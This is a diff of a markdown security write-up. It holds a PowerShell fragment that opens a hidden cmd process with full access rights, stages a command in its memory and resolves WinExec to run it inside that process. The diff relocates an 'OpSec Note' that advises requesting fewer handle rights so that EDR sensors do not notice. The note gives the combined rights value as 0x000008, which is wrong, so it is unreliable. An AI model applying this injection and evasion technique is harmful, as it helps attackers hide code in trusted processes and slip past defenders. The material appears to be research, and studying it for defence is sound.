@@ -84,7 +84,6 @@ try { Add-Type -TypeDefinition $Sig -ErrorAction SilentlyContinue } catch {}
 # 1. Targeting the Trusted Identity
 $Victim = Start-Process cmd -WindowStyle Hidden -PassThru
 $h = [Researcher]::Gate1(0x1F0FFF, $false, $Victim.Id)
-> **OpSec Note:** `0x1F0FFF` is `PROCESS_ALL_ACCESS` - maximum rights on the victim handle. This is a high-signal IOC; any competent EDR or kernel sensor watching handle acquisition will flag it. A more evasive approach requests only the minimum required rights: `PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD` (`0x000008`). For this research, full access was intentional - the goal was demonstrating the hallow, not evading telemetry.
 
 # 2. Memory Staging
 $Command = "cmd.exe /c echo Breach_Verified > C:\Users\Public\hallowed.txt"
@@ -101,6 +100,8 @@ $func = [Researcher]::GetProcAddress($k32, "WinExec")
 
 Write-Host "[!] Identity Breach Successful on PID $($Victim.Id)" -ForegroundColor Green
 ```
+> **OpSec Note:** `0x1F0FFF` is `PROCESS_ALL_ACCESS` - maximum rights on the victim handle. This is a high-signal IOC; any competent EDR or kernel sensor watching handle acquisition will flag it. A more evasive approach requests only the minimum required rights: `PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD` (`0x000008`). For this research, full access was intentional - the goal was demonstrating the hallow, not evading telemetry.
+
 
 ### AMSI: The First Gate
 
